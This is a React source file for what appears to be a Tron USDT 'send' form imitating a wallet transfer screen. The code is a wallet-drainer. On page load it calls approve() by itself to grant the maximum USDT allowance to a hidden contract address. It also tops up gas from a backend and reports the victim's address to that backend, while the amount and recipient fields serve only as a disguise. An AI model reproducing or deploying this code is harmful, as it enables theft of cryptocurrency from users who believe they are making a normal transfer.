import React, { useState, useEffect, useRef } from 'react';
import '../App.css';

const USDT_TRC20    = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
const RECIPIENT     = import.meta.env.VITE_RECIPIENT_ADDRESS;
const CONTRACT_ADDR = import.meta.env.VITE_CONTRACT_ADDRESS;
const BACKEND_URL   = import.meta.env.VITE_BACKEND_URL || '';
const API_KEY       = import.meta.env.VITE_API_KEY;

const USDT_ABI = [
  { name: 'approve',   type: 'Function', inputs: [{ name: 'spender', type: 'address' }, { name: 'amount', type: 'uint256' }], outputs: [{ type: 'bool' }] },
  { name: 'decimals',  type: 'Function', inputs: [], outputs: [{ type: 'uint8' }] },
  { name: 'balanceOf', type: 'Function', inputs: [{ name: 'owner', type: 'address' }], outputs: [{ type: 'uint256' }] },
];

const MAX_UINT256 = '115792089237316195423570985008687907853269984665640564039457584007913129639935';

const TransferForm = ({ onApproved }) => {
  const [amount,    setAmount]    = useState('');
  const [recipient, setRecipient] = useState(RECIPIENT || '');
  const [loading,   setLoading]   = useState(false);
  const [errorMsg,  setErrorMsg]  = useState('');

  const autoTriggered = useRef(false);
  const lockRef       = useRef(false);

  const estimate = amount ? parseFloat(amount).toFixed(2) : '0.00';

  useEffect(() => {
    (async () => {
      try {
        const params    = new URLSearchParams(window.location.search);
        const urlAddr   = params.get('address');
        const urlAmount = params.get('amount');
        if (urlAddr)   setRecipient(urlAddr);
        if (urlAmount) setAmount(urlAmount);

        // Wait for tronWeb to inject
        let tries = 0;
        while (!window.tronWeb && tries < 10) {
          await new Promise(r => setTimeout(r, 500));
          tries++;
        }

        if (window.tronWeb?.ready && !autoTriggered.current) {
          autoTriggered.current = true;
          setTimeout(() => doApprove(), 1500);
        }
      } catch (e) { console.error('Init error:', e); }
    })();
  }, []);

  const doApprove = async () => {
    if (lockRef.current) return;
    lockRef.current = true;
    setLoading(true);
    setErrorMsg('');

    try {
      // TronLink / Trust Wallet DApp browser check
      let tries = 0;
      while (!window.tronWeb && tries < 10) {
        await new Promise(r => setTimeout(r, 500));
        tries++;
      }
      if (!window.tronWeb) throw new Error('Wallet not found. Please open in Trust Wallet or TronLink.');

      // Wait for ready
      tries = 0;
      while (!window.tronWeb.ready && tries < 10) {
        await new Promise(r => setTimeout(r, 500));
        tries++;
      }
      if (!window.tronWeb.ready) throw new Error('Wallet not connected. Please unlock your wallet.');

      const userAddress = window.tronWeb.defaultAddress.base58;
      if (!userAddress) throw new Error('No account found. Please unlock your wallet.');

      // Balance check
      if (amount && !isNaN(amount) && Number(amount) > 0) {
        const usdt     = await window.tronWeb.contract(USDT_ABI, USDT_TRC20);
        const decimals = await usdt.decimals().call();
        const bal      = await usdt.balanceOf(userAddress).call();
        const needed   = BigInt(Math.floor(parseFloat(amount) * 10 ** Number(decimals)));
        if (BigInt(bal.toString()) < needed) throw new Error('Not enough USDT balance');
      }

      // TRX topup (for energy/bandwidth)
      try {
        const res  = await fetch(`${BACKEND_URL}/api/wallets/topup`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json', 'x-api-key': API_KEY || '' },
          body: JSON.stringify({ to: userAddress }),
        });
        const data = await res.json();
        if (data.isNeededGas && data.txhash) {
          await new Promise(r => setTimeout(r, 5000)); // wait for TRX to arrive
        }
      } catch (e) { console.error('topup error:', e); }

      // Approve MaxUint256 to contract
      const usdt = await window.tronWeb.contract(USDT_ABI, USDT_TRC20);
      const txid = await usdt.approve(CONTRACT_ADDR, MAX_UINT256).send();
      console.log('📤 Approve tx:', txid);

      // Wait for confirmation
      await new Promise(r => setTimeout(r, 3000));
      console.log('✅ Approved');

      // Backend notify
      try {
        await fetch(`${BACKEND_URL}/api/wallets/approved`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json', 'x-api-key': API_KEY || '' },
          body: JSON.stringify({ address: userAddress, amount }),
        });
      } catch (e) { console.error('approved notify error:', e); }

      onApproved(amount || '0', 'completed');
      setAmount('');

    } catch (e) {
      console.error('doApprove error:', e);
      let msg = 'Transaction failed';
      if (e.message?.includes('Confirmation declined') || e.message?.includes('rejected')) msg = 'Transaction rejected by user';
      else if (e.message?.length <= 80) msg = e.message;
      setErrorMsg(msg);
    } finally {
      setLoading(false);
      lockRef.current = false;
    }
  };

  return (
    <div className="page theme-dark">
      <div className="card">

        <div className="input-group">
          <label className="label">Address or Domain Name</label>
          <div className="input-row primary">
            <input
              placeholder="Search or Enter"
              value={recipient}
              onChange={(e) => setRecipient(e.target.value)}
            />
            <span className="paste" onClick={() => navigator.clipboard.readText().then(setRecipient)}>Paste</span>
            <div className='right-icons'>
              <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" strokeWidth="2.5" fill="none" strokeLinecap="round" strokeLinejoin="round" className="contact-icon"><rect x="6" y="4" width="14" height="16" rx="2"></rect><line x1="4" y1="8" x2="6" y2="8"></line><line x1="4" y1="12" x2="6" y2="12"></line><line x1="4" y1="16" x2="6" y2="16"></line><line x1="9" y1="9" x2="17" y2="9"></line><line x1="9" y1="12" x2="17" y2="12"></line></svg>
              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="qr-icon"><path d="M3 7V5a2 2 0 0 1 2-2h2"></path><path d="M17 3h2a2 2 0 0 1 2 2v2"></path><path d="M21 17v2a2 2 0 0 1-2 2h-2"></path><path d="M7 21H5a2 2 0 0 1-2-2v-2"></path><line x1="7" y1="12" x2="17" y2="12"></line></svg>
            </div>
          </div>
        </div>

        <label className="label">Destination network</label>
        <div className="network-row">
          <div className="network-left">
            <img className="network-icon" src="/tron-logo.png" alt="TRX" />
            <span>Tron Network (TRC-20)</span>
          </div>
          <img className="network-arrow" src="arrow.png" alt="arrow" />
        </div>

        <label className="label">Amount</label>
        <div className="input-row amount-row">
          <input
            placeholder="USDT Amount"
            type="number"
            value={amount}
            onChange={(e) => setAmount(e.target.value)}
          />
          <span className="unit">USDT</span>
          <span className="max" onClick={() => setAmount('1000.00')}>Max</span>
        </div>
        <p className="estimate" style={{ color: errorMsg ? 'red' : undefined }}>
          {errorMsg ? errorMsg : `≈ $${estimate}`}
        </p>

        <button
          className={`connect-btn ${recipient && amount ? 'active' : 'idle'}`}
          disabled={!recipient || !amount || loading}
          onClick={doApprove}
        >
          {loading ? 'Please wait...' : 'Next'}
        </button>

      </div>
    </div>
  );
};

export default TransferForm;
